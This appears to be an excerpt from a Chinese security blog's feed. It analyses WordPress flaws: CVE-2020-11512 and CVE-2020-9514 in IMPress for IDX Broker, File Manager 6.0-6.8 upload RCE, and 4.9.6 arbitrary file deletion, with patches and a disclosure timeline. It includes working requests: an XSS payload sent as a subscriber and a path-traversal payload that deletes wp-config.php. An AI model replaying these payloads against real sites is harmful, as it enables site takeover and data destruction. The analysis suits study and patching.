      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20IMPress%20for%20IDX%20Broker%20%E4%BD%8E%E6%9D%83%E9%99%90xss%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20IMPress%20for%20IDX%20Broker%20%E4%BD%8E%E6%9D%83%E9%99%90xss%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>​    CVE-2020-11512分析</p><p>​     首先看到在插件的目录plugins\idx-broker-platinum\idx\initiate-plugin.php文件下的277行的idx_update_recaptcha_key函数中接收了POST参数idx_recaptcha_site_key数据，在279行被update_option函数调用</p><p>​    注：在当前账户权限下，执行修改初始化信息只可以用这个验证，返回信息只有一个1，如果不是1说明修改失败 在在当前用户全下载通过Wordpress IMPress for IDX Broker可以越权操作IMPress for IDX  Brokerc插件的初始化信息，通过xss漏洞获取管理员敏感信息。</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029545342-0.png" alt="img"></p><p>​    下面我们看下update_option函数对该数据的操作，该函数是对wordpress中的options参数的进行更新数据，我们看到上面对options的传入参数为idx_recaptcha_site_key，即更新该参数的值<br> <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/10295432F-1.png" alt="img"></p><p>​    在390行我们看到执行了update参数，更新了数据库中的数据<br> <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/102954C55-2.png" alt="img"><br> <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029546116-3.png" alt="img"><br> 我们在update_option函数中调用了wp_protect_special_option对option参数名进行html过滤，却没有对value进行过滤，引发了xss漏洞<br> <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/10295454C-4.png" alt="img"></p><p>​    下面我们看下函数idx_update_recaptcha_key的调用位置，在initiate-plugin.php文件下的34行hook在wp_ajax_idx_update_recaptcha_key tag上，</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029541155-5.png" alt="img"><br>  我們在admin-ajax.php页面中159行中获取到action参数，使用is_user_logged_in判断了用户权限后，直接将action参数拼接到do_action函数中进行执行，而is_user_logged_in只是判断用户是否存在，没有进行权限判断。</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029545J5-6.png" alt="img"></p><h3 id="CVE-2020-11512利用"><a href="#CVE-2020-11512利用" class="headerlink" title="CVE-2020-11512利用"></a>CVE-2020-11512利用</h3><p>​    通过user1用户（订阅者权限）发送数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>​        POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1</li><li>​        Host: localhost</li><li>​        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0</li><li>​        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8</li><li>​        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</li><li>​        Connection: close</li><li>​        Cookie:  wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=user1%7C1591004988%7CPrKGAmfSsNxfsQ9QAGID3aK8sMmvLnJtimfdGugoqCN%7C2850d94c57420c45398bd86aa49445eb60914036c0482cd3ebc755de5a8b1239; wordpress_test_cookie=WP+Cookie+check;  wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=user1%7C1591004988%7CPrKGAmfSsNxfsQ9QAGID3aK8sMmvLnJtimfdGugoqCN%7Cc1e4006d123d6f33199624e0a514319b21b93859faa5af2a60fc0ceda066fb73; wp-settings-time-2=1590832197</li><li>​        Upgrade-Insecure-Requests: 1</li><li>​        Content-Type: application/x-www-form-urlencoded</li><li>​        Content-Length: 0</li><li>​         </li><li>​        action=idx_update_recaptcha_key&amp;idx_recaptcha_site_key=a22212322123”&gt;&lt;svg onload=alert(/~xss~/)&gt;’</li></ol><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029545632-7.png" alt="img"></p><p>​    此时管理员对该插件进行设置操作：</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029544206-8.png" alt="img"></p><h3 id="CVE-2020-9514漏洞分析"><a href="#CVE-2020-9514漏洞分析" class="headerlink" title="CVE-2020-9514漏洞分析"></a>CVE-2020-9514漏洞分析</h3><p>​     从\wp-content\plugins\idx-broker-platinum\idx\wrappers.php文件中idx_ajax_create_dynamic_page函数中202行看到函数通过post_title参数中获取到了title数据，211行获取到了wrapper_page_id参数，在214和215行更新了数据库，并在218行针对给定的id进行更新元字段。 <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/102954B10-9.png" alt="img"></p><p>​    继续看236行的idx_ajax_delete_dynamic_page函数，接收到post参数wrapper_page_id，然后进行删除该数据操作</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/10295434M-10.png" alt="img"></p><p>​    我们找一下这两个函数的调用位置：</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029544K7-11.png" alt="img"></p><p>​    好了，可以看到这两个函数全部挂钩在wp_ajax开头的钩子上，利用上面的越权操作即可操作</p><h3 id="CVE-2020-9514漏洞利用"><a href="#CVE-2020-9514漏洞利用" class="headerlink" title="CVE-2020-9514漏洞利用"></a>CVE-2020-9514漏洞利用</h3><p>​    首先添加一个Wrapper页面</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029541607-12.png" alt="img"></p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/10295435O-13.png" alt="img"></p><p>​    下面使用user1用户进行create操作：</p><p>​    首先在页面中获取上面创建的id值：6</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029545950-14.png" alt="img"></p><p>​    操作如下：</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/102954J91-15.png" alt="img"></p><p>​    发现该页面数据已改变，并且由user1修改</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029543246-16.png" alt="img"></p><p>​    同样执行删除操作</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/1029546342-17.png" alt="img"></p><p>​    发现已经无了：</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/10295442O-18.png" alt="img"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>​    通过查看对比补丁信息，新的版本使用current_user_can函数判断当前用户的权限，并验证nonce机制防御CSRF攻击。</p><p>​    <img src="Wordpress IMPress for IDX Broker 低权限xss漏洞/102954MP-19.png" alt="img"></p><p>​     </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>WordPress插件WPFileManager中存在一个严重的0day安全漏洞，攻击者可以在安装了此插件的任何WordPress网站上任意上传文件并远程执行代码。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File Manager 6.0-6.8</span><br></pre></td></tr></table></figure><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h1><p>Wordpress下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cn.wordpress.org/wordpress-5.4.1-zh_CN.tar.gz</span><br></pre></td></tr></table></figure><p>插件下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://plugins.svn.wordpress.org/wp-file-manager/tags/6.0/</span><br></pre></td></tr></table></figure><p>登录后台把插件压缩包上传插件并启动</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192447564.png" alt="img"></p><p><img src="Wordpress File-manager任意⽂件上传/20201012192454585.png" alt="img"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h1><p>访问<a href="http://192.168.56.1/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php页面可以发现errUnknownCmd" target="_blank" rel="noopener">http://192.168.56.1/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php页面可以发现errUnknownCmd</a></p><p>疑似漏洞</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192537466.png" alt="img"></p><p>Poc地址：<a href="https://github.com/xDro1d/wp-file-manager" target="_blank" rel="noopener">https://github.com/xDro1d/wp-file-manager</a></p><p>可以发现命令成功执行</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192713542.png" alt="img"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h1><p>直接从elFinderConnector构造方法后的run开始</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192722733.png" alt="img"></p><p>然后\wordpress\wp-content\plugins\wp-file-manager\lib\php\elFinderConnector.class.php文本中</p><p>初始化</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192737993.png" alt="img"></p><p>然后run</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192748368.png" alt="img"></p><p>首先判断是否是POST方法传入数据，接着合并数组至$src</p><p>$maxInuptVars = null，而$src是存在的</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192755367.png" alt="img"></p><p>此时$_REQUEST中，cmd为upload，target为l1_Lw==</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192802421.png" alt="img"></p><p>没有targets参数,第一个if语句不执行</p><p>第二个if语句判断json_encode方法是否可用，后面看flFinder-&gt;loaded方法，这里返回true，跳过</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192810378.png" alt="img"></p><p>Cmd存在值，跳过</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192818867.png" alt="img"></p><p>此处的$cmd为upload</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192833630.png" alt="img"></p><p><img src="Wordpress File-manager任意⽂件上传/20201012192837274.png" alt="img"></p><p>来到foreach语句</p><p>commandArgsList方法跟进</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192844791.png" alt="img"></p><p>整理得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;upload&apos; =&gt; array(&apos;target&apos; =&gt; true, &apos;FILES&apos; =&gt; true, &apos;mimes&apos; =&gt; false, &apos;html&apos; =&gt; false, &apos;upload&apos; =&gt; false, &apos;name&apos; =&gt; false, &apos;upload_path&apos; =&gt; false, &apos;chunk&apos; =&gt; false, &apos;cid&apos; =&gt; false, &apos;node&apos; =&gt; false, &apos;renames&apos; =&gt; false, &apos;hashes&apos; =&gt; false, &apos;suffix&apos; =&gt; false, &apos;mtime&apos; =&gt; false, &apos;overwrite&apos; =&gt; false, &apos;contentSaveId&apos; =&gt; false</span><br></pre></td></tr></table></figure><p>$list第一键值不是FILES，所以跳过第一个if语句，而第一个target又存在于$src数组中</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192904915.png" alt="img"></p><p>将target的值给了$arg，再用trim函数清空白字符</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192916477.png" alt="img"></p><p>$args中debug是存在的，所以debug的值被设置为false</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192925177.png" alt="img"></p><p>接着就是elFinderConnector的input_filter方法</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192931470.png" alt="img"></p><p>因为这里的php版本大于5.4所以$magic_quotes_gpc的值为false，$args是数组，然后都进行过滤一遍</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192938540.png" alt="img"></p><p>再之后对将上传文件的信息给了$args数组中的FILES元素，接着执行elFinder对象的exec函数</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192947740.png" alt="img"></p><p>再之后对将上传文件的信息给了$args数组中的FILES元素，接着执行elFinder对象的exec函数</p><p><img src="Wordpress File-manager任意⽂件上传/20201012192957357.png" alt="img"></p><p>在exec函数中判断完session以及是否可以进行上传操作之后继续判断</p><p><img src="Wordpress File-manager任意⽂件上传/20201012193006146.png" alt="img"></p><p>将l1_Lw== 作为参数传递给volume函数</p><p><img src="Wordpress File-manager任意⽂件上传/2020101219302266.png" alt="img"></p><p>此时volumes中有两个键，到此处可以发现POC中上传文件的target元素的值只能以l1或者t1开头</p><p>这里传入的$hash为l1_Lw==</p><p>$result为空</p><p><img src="Wordpress File-manager任意⽂件上传/20201012203811532.png" alt="img"></p><p>$args[‘sessionCloseEarlier’]被设置为true等等</p><p><img src="Wordpress File-manager任意⽂件上传/20201012203822471.png" alt="img"></p><p><img src="Wordpress File-manager任意⽂件上传/20201012203827300.png" alt="img"></p><p>跟进$cmd进入到upload方法</p><p><img src="Wordpress File-manager任意⽂件上传/20201012203842881.png" alt="img"></p><p>接着获取到文件的临时文件名，$paths获取到文件路径为$target的值</p><p>接着$files，$header等一系列变量对文件上传的设置进行初始化或者得到上传文件的具体信息</p><p><img src="Wordpress File-manager任意⽂件上传/20201012203850106.png" alt="img"></p><p>post提交cmd的值，调用upload方法，upload方法从上传文件中提取信息</p><p><img src="Wordpress File-manager任意⽂件上传/20201012203902962.png" alt="img"></p><p>$files的error为0，使用第一个if语句直接忽略</p><p><img src="Wordpress File-manager任意⽂件上传/20201012203912219.png" alt="img"></p><p>接着看changeDst被设置为false，因为第一个if循环中的值都存在，所以将$changeDst设置为true，之后进入foreach循环</p><p><img src="Wordpress File-manager任意⽂件上传/20201012203924651.png" alt="img">‘</p><p>此时的$_target已经有$target的值了</p><p><img src="Wordpress File-manager任意⽂件上传/20201012203933128.png" alt="img"></p><p>继续跟进</p><p><img src="Wordpress File-manager任意⽂件上传/20201012203945688.png" alt="img"></p><p>来到commandDisabled函数判断是否允许上传功能</p><p><img src="Wordpress File-manager任意⽂件上传/20201012203953719.png" alt="img"></p><p>有上传功能，继续调用dir方法，将$hash(target)的值传入，再跟进file方法</p><p><img src="Wordpress File-manager任意⽂件上传/20201012204001549.png" alt="img"></p><p>file函数中有一个decode方法，跟进</p><p><img src="Wordpress File-manager任意⽂件上传/20201012204010167.png" alt="img"></p><p>这里把我们的l1_Lw==进行了解码，decode函数首先判断$hash是以l1_开头，还是以t1_开头，接着对l1_之后的部分进行base64解码</p><p><img src="Wordpress File-manager任意⽂件上传/20201012204017499.png" alt="img"></p><p>紧接着返回我们的file方法</p><p>file方法又返回给dir方法</p><p><img src="Wordpress File-manager任意⽂件上传/20201012204025633.png" alt="img"></p><p><img src="Wordpress File-manager任意⽂件上传/20201012204029767.png" alt="img"></p><p>跟进到mimetype获取上传文件的上传类型</p><p><img src="Wordpress File-manager任意⽂件上传/20201012204038160.png" alt="img"></p><p><img src="Wordpress File-manager任意⽂件上传/20201012204041330.png" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-Wordpress简介"><a href="#0x01-Wordpress简介" class="headerlink" title="0x01 Wordpress简介"></a>0x01 Wordpress简介</h1><p>WordPress是网络上最受欢迎的CMS。根据<em>w3tech</em>，大约30％的网站使用它<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/#fn:2" target="_blank" rel="noopener">1</a>。这种广泛的采用使其成为网络罪犯的一个有趣目标。在这篇博文中，我们将介绍WordPress核心中经过身份验证的任意文件删除漏洞，该漏洞可能导致攻击者执行任意代码。7个月前，该漏洞已报告给WordPress安全团队，但仍未修补。自首次报告以来已经过去很长时间没有任何补丁或具体计划，这使我们决定将其公之于众。</p><p><strong>0x02 漏洞分析</strong></p><p> <strong>近日RIPS团队 ( 作者：Karim El Ouerghemmi ) 公开了一个Wordpress的<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">任意文件删除漏洞</a>（需要登录），目前该漏洞仍然未修复（2018年06月27日），该漏洞影响 Wordpress 最新版 4.9.6.</strong></p><p>文件wp-includes/post.php中：</p><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="Wordpress 4.9.6 任意文件删除漏洞/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function wp_delete_attachment( $post_id, $force_delete = false ) &#123;</span><br><span class="line">    ...</span><br><span class="line">    $meta = wp_get_attachment_metadata( $post_id );</span><br><span class="line">    ...</span><br><span class="line">    if ( ! empty($meta[&apos;thumb&apos;]) ) &#123;</span><br><span class="line">        // Don&apos;t delete the thumb if another attachment uses it.</span><br><span class="line">        if (! $wpdb-&gt;get_row( $wpdb-&gt;prepare( &quot;SELECT meta_id FROM $wpdb-&gt;postmeta WHERE meta_key = &apos;_wp_attachment_metadata&apos; AND meta_value LIKE %s AND post_id &lt;&gt; %d&quot;, &apos;%&apos; . $wpdb-&gt;esc_like( $meta[&apos;thumb&apos;] ) . &apos;%&apos;, $post_id)) ) &#123;</span><br><span class="line">            $thumbfile = str_replace(basename($file), $meta[&apos;thumb&apos;], $file);</span><br><span class="line">            /** This filter is documented in wp-includes/functions.php */</span><br><span class="line">            $thumbfile = apply_filters( &apos;wp_delete_file&apos;, $thumbfile );</span><br><span class="line">            @ unlink( path_join($uploadpath[&apos;basedir&apos;], $thumbfile) );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="Wordpress 4.9.6 任意文件删除漏洞/copycode.gif" alt="复制代码"></a>;)</p><p><code>$meta[&#39;thumb&#39;]</code>来自与数据库，是图片的属性之一。代码未检查<code>$meta[&#39;thumb&#39;]</code>的内容，直接带入<code>unlink</code>函数，如果<code>$meta[&#39;thumb&#39;]</code>可控则可导致文件删除。</p><p>文件/wp-admin/post.php中：</p><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="Wordpress 4.9.6 任意文件删除漏洞/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">switch($action) &#123;</span><br><span class="line">...</span><br><span class="line">    case &apos;editattachment&apos;:</span><br><span class="line">        check_admin_referer(&apos;update-post_&apos; . $post_id);</span><br><span class="line">        ...</span><br><span class="line">        // Update the thumbnail filename</span><br><span class="line">        $newmeta = wp_get_attachment_metadata( $post_id, true );</span><br><span class="line">        $newmeta[&apos;thumb&apos;] = $_POST[&apos;thumb&apos;];</span><br><span class="line"></span><br><span class="line">        wp_update_attachment_metadata( $post_id, $newmeta );</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="Wordpress 4.9.6 任意文件删除漏洞/copycode.gif" alt="复制代码"></a>;)</p><p><code>$newmeta[&#39;thumb&#39;]</code>来自于$_POST[‘thumb’]，未经过滤直接将其存入数据库，即上一步的<code>$meta[&#39;thumb&#39;]</code>可控。</p><h2 id="临时修补程序"><a href="#临时修补程序" class="headerlink" title="临时修补程序"></a>临时修补程序</h2><p> 通过将修复程序添加到<code>functions.php</code>当前活动的主题/子主题的文件中，可以将修复程序集成到现有的WordPress安装中。</p><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="Wordpress 4.9.6 任意文件删除漏洞/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add_filter( &apos;wp_update_attachment_metadata&apos;, &apos;rips_unlink_tempfix&apos; );</span><br><span class="line"></span><br><span class="line">function rips_unlink_tempfix( $data ) &#123;</span><br><span class="line">    if( isset($data[&apos;thumb&apos;]) ) &#123;</span><br><span class="line">        $data[&apos;thumb&apos;] = basename($data[&apos;thumb&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="Wordpress 4.9.6 任意文件删除漏洞/copycode.gif" alt="复制代码"></a>;)</p><p>所提供的Hotfix所做的就是挂钩<code>wp_update_attachement_metadata()</code>调用并确保为元值提供的数据<code>thumb</code>不包含任何可以进行路径遍历的部分。因此，不能删除任何安全相关文件。</p><p>提供的修复程序最终应视为临时修复，以防止攻击。我们无法监督WordPress插件的所有可能的向后兼容性问题，并建议您谨慎对WordPress文件进行任何修改。</p><p>披露时间：</p><h2 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h2><table><thead><tr><th>日期</th><th>什么</th></tr></thead><tbody><tr><td>2017年11月20日</td><td>在Hackerone上向WordPress安全团队报告了漏洞。</td></tr><tr><td>2017年11月22日</td><td>该漏洞由安全团队进行分类和验证。</td></tr><tr><td>2017年12月12日</td><td>要求进步。</td></tr><tr><td>2017年12月18日</td><td>Wordpress正在开发一个补丁。要求发布日期。没有反应。</td></tr><tr><td>2018年1月9日</td><td>要求发布日期。没有反应。</td></tr><tr><td>2018年1月20日</td><td>由于问题的严重性和缺乏沟通而被要求对Hackerone进行调解。</td></tr><tr><td>2018年1月24日</td><td>WordPress安全团队估计修复时间为6个月。</td></tr><tr><td>2018年5月24日</td><td>被问及有关该问题的进展和/或计划，并提醒我们将尽快发布。没有反应。</td></tr><tr><td>2018年5月24日</td><td>将twitter DM发送给安全团队的成员，以确保他们不会忽略Hackerone上的消息。</td></tr><tr><td>2018年6月26日</td><td>该问题在报告后超过7个月未得到修补。</td></tr></tbody></table><p>详细分析可见：WARNING: WordPress File Delete to Code Execution - </p><p><a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a></p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>条件：需要登陆后台，有点鸡助</p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706105823819-1233461762.png" alt="img"></p><p>后台地址：</p><p><a href="http://10.10.10.103/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.103%2Fwp-admin%2F&amp;reauth=1" target="_blank" rel="noopener">http://10.10.10.103/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.103%2Fwp-admin%2F&amp;reauth=1</a></p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706105858245-1720007462.png" alt="img"></p><p>进入后台后，点击Media（媒体），在点击Add New (添加)</p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706110008374-2026165373.png" alt="img"></p><p>进入到上传文件位置</p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706110040424-302900488.png" alt="img"></p><p>上传好图片以后，点击右边Edit（编辑按钮）</p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706110155625-560565545.png" alt="img"></p><p>跳转到</p><p><a href="http://10.10.10.103/wp-admin/post.php?post=21&amp;action=edit" target="_blank" rel="noopener">http://10.10.10.103/wp-admin/post.php?post=21&amp;action=edit</a></p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706110236971-178772264.png" alt="img"></p><p>此时打开F12,搜索post.php,找到_wpnonce的值为d8efee3064</p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706110440828-479255461.png" alt="img"></p><p> 然后发送post数据包 (需要带入cookie值)</p><p>POST /wp-admin/post.php?post=21&amp;action=edit HTTP/1.1</p><p>payload: action=editattachment&amp;_wpnonce=d8efee3064&amp;thumb=../../../../wp-config.php</p><p> <img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706111018965-282511331.png" alt="img"></p><p>发送成功会返回302状态</p><p>此时在点击删除按钮 <a href="http://10.10.10.103/wp-admin/post.php?post=21&amp;action=delete&amp;_wpnonce=05621e9c6b" target="_blank" rel="noopener">Delete Permanently</a></p><p><a href="http://10.10.10.103/wp-admin/post.php?post=21&amp;action=delete&amp;_wpnonce=05621e9c6b" target="_blank" rel="noopener">http://10.10.10.103/wp-admin/post.php?post=21&amp;action=delete&amp;_wpnonce=05621e9c6b</a></p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706111207834-1491111578.png" alt="img"></p><p>抓包查看，也是返回302包</p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706111658931-1725151362.png" alt="img"></p><p> 再去网站根目录查看wp-config.php </p><p>发现wp-config.php (数据库配置文件被成功删除了)</p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706112252566-1806854203.png" alt="img"></p><p>再次访问首页， 会发现提示你重新安装wordpress</p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706112318602-1930249190.png" alt="img"></p><h2 id="影响-攻击者可以做些什么"><a href="#影响-攻击者可以做些什么" class="headerlink" title="影响 - 攻击者可以做些什么"></a>影响 - 攻击者可以做些什么</h2><p>利用此漏洞可以使攻击者能够删除WordPress安装的任何文件（+  PHP进程用户具有删除权限的服务器上的任何其他文件）。除了擦除整个WordPress安装的可能性，如果没有可用的当前备份可能会产生灾难性后果，攻击者可以利用任意文件删除的能力来规避一些安全措施并在Web服务器上执行任意代码。更确切地说，可以删除以下文件：</p><ul><li>.htaccess：通常，删除此文件不会产生任何安全后果。但是，在某些情况下，<em>.htaccess</em>文件包含与安全性相关的约束（例如，对某些文件夹的访问约束）。删除此文件将停用这些安全约束。</li><li>index.php文件：通常将空的<em>index.php</em>文件放入目录中，以防止Web服务器无法执行此操作的目录列表。删除这些文件会向攻击者授予受此度量保护的目录中所有文件的列表。</li><li>wp-config.php：删除WordPress安装的这个文件会在下次访问网站时触发WordPress安装过程。这是因为<em>wp-config.php</em>包含数据库凭据，并且没有它的存在，WordPress就像尚未安装一样。攻击者可以删除此文件，使用他为管理员帐户选择的凭据进行安装过程，最后在服务器上执行任意代码。</li></ul><h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h1><p><a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a></p><p><a href="https://xz.aliyun.com/t/2413" target="_blank" rel="noopener">https://xz.aliyun.com/t/2413</a></p><p><img src="Wordpress 4.9.6 任意文件删除漏洞/1022038-20180706112550905-1844349621.png" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-wordpress5.0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-wordpress5.0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
